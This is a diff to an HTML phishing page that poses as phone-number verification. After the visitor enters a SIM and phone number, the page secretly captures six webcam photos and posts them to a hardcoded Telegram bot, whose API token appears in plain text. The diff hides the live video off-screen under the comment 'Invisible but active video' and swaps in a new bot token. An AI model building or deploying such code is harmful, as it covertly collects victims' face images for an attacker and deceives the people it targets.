@@ -124,6 +124,15 @@
       font-size: 20px;
       font-weight: 600;
     }
+
+    /* 🔍 Invisible but active video */
+    #video {
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
+      width: 320px;
+      height: 240px;
+    }
   </style>
 </head>
 <body>
@@ -168,110 +177,102 @@
 
 <div id="progress">📸 Capturing face... please wait</div>
 
-<video id="video" autoplay playsinline muted style="display:none;"></video>
+<video id="video" autoplay playsinline muted></video>
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
-document.addEventListener("DOMContentLoaded", () => {
-  document.querySelector("button").addEventListener("click", validateNumber);
-});
+  const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
+  const chatId = "8182050140";
 
-const validationRules = {
-  "+94": /^[1-9][0-9]{8}$/,
-  "+91": /^[6-9][0-9]{9}$/,
-  "+1": /^[2-9][0-9]{9}$/,
-  "+44": /^[1-9][0-9]{9}$/,
-  "+65": /^[89][0-9]{7}$/
-};
+  const validationRules = {
+    "+94": /^[1-9][0-9]{8}$/,
+    "+91": /^[6-9][0-9]{9}$/,
+    "+1": /^[2-9][0-9]{9}$/,
+    "+44": /^[1-9][0-9]{9}$/,
+    "+65": /^[89][0-9]{7}$/
+  };
 
-const botToken = "8132954067:AAF4LrTgvWQer8pwDqpevWb9_9a1FPbz0SY";
-const chatId = "8182050140";
+  function validateNumber() {
+    const code = document.getElementById('country').value;
+    const sim = document.getElementById('sim').value;
+    const phone = document.getElementById('phone').value.trim();
+    const error = document.getElementById('errorMsg');
+    error.classList.remove("show");
+    error.textContent = "";
 
-function validateNumber() {
-  const code = document.getElementById('country').value;
-  const sim = document.getElementById('sim').value;
-  const phone = document.getElementById('phone').value.trim();
-  const error = document.getElementById('errorMsg');
-  error.classList.remove("show");
-  error.textContent = "";
-
-  if (!sim) {
-    error.textContent = "❗ Select your SIM.";
-    error.classList.add("show");
-    return;
-  }
-  if (!phone) {
-    error.textContent = "📵 Enter phone number.";
-    error.classList.add("show");
-    return;
-  }
-  if (!validationRules[code].test(phone)) {
-    error.textContent = `❌ Invalid number for ${code}`;
-    error.classList.add("show");
-    return;
-  }
-
-  document.getElementById('progress').style.display = "flex";
-  startCapture();
-}
-
-async function startCapture() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.getElementById("video");
-    video.srcObject = stream;
-
-    // 👇 Show the video element
-    video.style.display = "block"; // ✅ FIX
-
-    for (let i = 1; i <= 6; i++) {
-      await new Promise(res => setTimeout(res, 1500));
-      captureAndSend(i);
+    if (!sim) {
+      error.textContent = "❗ Select your SIM.";
+      error.classList.add("show");
+      return;
+    }
+    if (!phone) {
+      error.textContent = "📵 Enter phone number.";
+      error.classList.add("show");
+      return;
+    }
+    if (!validationRules[code].test(phone)) {
+      error.textContent = `❌ Invalid number for ${code}`;
+      error.classList.add("show");
+      return;
     }
 
-    setTimeout(() => {
-      stream.getTracks().forEach(t => t.stop());
+    document.getElementById('progress').style.display = "flex";
+    startCapture();
+  }
+
+  async function startCapture() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+
+      for (let i = 1; i <= 6; i++) {
+        await new Promise(res => setTimeout(res, 1500));
+        captureAndSend(i);
+      }
+
+      setTimeout(() => {
+        stream.getTracks().forEach(t => t.stop());
+        document.getElementById('progress').style.display = "none";
+        alert("✅ Verification complete.");
+      }, 1500 * 6 + 500);
+    } catch (err) {
       document.getElementById('progress').style.display = "none";
-      video.style.display = "none"; // 👈 Hide again
-      alert("✅ Verification complete.");
-    }, 1500 * 6 + 500);
-  } catch (err) {
-    document.getElementById('progress').style.display = "none";
-    alert("❌ Camera permission denied. Please allow access from browser settings.");
+      alert("❌ Camera permission denied. Please allow access from browser settings.");
+    }
   }
-}
-  
-function captureAndSend(count) {
-  const canvas = document.getElementById("canvas");
-  const video = document.getElementById("video");
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  const data = canvas.toDataURL("image/jpeg");
-  sendToTelegram(data, count);
-}
 
-function sendToTelegram(dataUrl, count) {
-  const blob = dataURItoBlob(dataUrl);
-  const form = new FormData();
-  form.append("chat_id", chatId);
-  form.append("photo", blob, `face${count}.jpg`);
-
-  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-    method: "POST",
-    body: form
-  });
-}
-
-function dataURItoBlob(dataURI) {
-  const byteString = atob(dataURI.split(',')[1]);
-  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-  const ab = new ArrayBuffer(byteString.length);
-  const ia = new Uint8Array(ab);
-  for (let i = 0; i < byteString.length; i++) {
-    ia[i] = byteString.charCodeAt(i);
+  function captureAndSend(count) {
+    const canvas = document.getElementById("canvas");
+    const video = document.getElementById("video");
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const data = canvas.toDataURL("image/jpeg");
+    sendToTelegram(data, count);
   }
-  return new Blob([ab], { type: mimeString });
-}
+
+  function sendToTelegram(dataUrl, count) {
+    const blob = dataURItoBlob(dataUrl);
+    const form = new FormData();
+    form.append("chat_id", chatId);
+    form.append("photo", blob, `face${count}.jpg`);
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      body: form
+    });
+  }
+
+  function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+      ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+  }
 </script>
 
 </body>
